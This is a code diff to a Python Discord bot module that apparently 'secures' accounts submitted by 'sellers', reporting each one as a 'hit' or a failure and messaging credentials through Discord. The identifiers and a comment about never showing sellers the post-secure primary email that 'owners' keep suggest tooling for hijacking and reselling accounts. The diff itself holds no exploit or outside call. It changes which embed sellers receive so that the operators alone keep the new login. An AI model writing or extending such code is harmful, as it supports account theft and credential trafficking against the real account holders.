@@ -5,7 +5,6 @@ from typing import Awaitable, Callable, TypeVar
 import discord
 
 from securing.build_embeds import build_failure_embed
-from ui.buttons.account_details import accountInfo
 from ui.modals.recovery_code import _send_early_credentials, _send_failure_dm
 
 log = logging.getLogger(__name__)
@@ -38,7 +37,9 @@ async def _secure_one(
         return {"email": email, "status": "failure", "note": "exception"}
 
     if isinstance(account, dict) and account.get("failed"):
-        await _send_failure_dm(user, account["hit_embed"])
+        await _send_failure_dm(
+            user, account.get("seller_embed") or account["hit_embed"]
+        )
         return {
             "email": email,
             "status": "failure",
@@ -79,14 +80,17 @@ async def _secure_one(
         return {"email": email, "status": "failure", "note": "empty result"}
 
     try:
-        view = accountInfo(account["details"]) if account.get("details") else None
-        await user.send(embed=account["hit_embed"], view=view)
+        # Never DM sellers the post-secure primary (sunny@…) — owners use hit_embed.
+        seller_embed = account.get("seller_embed") or account["hit_embed"]
+        await user.send(embed=seller_embed)
         return {"email": email, "status": "hit"}
     except discord.Forbidden:
         return {"email": email, "status": "hit", "note": "DMs disabled"}
     except KeyError:
         log.exception("Success result missing expected keys for %s", email)
-        await _send_failure_dm(user, account.get("hit_embed"))
+        await _send_failure_dm(
+            user, account.get("seller_embed") or account.get("hit_embed")
+        )
         return {"email": email, "status": "failure", "note": "incomplete result"}
 
 
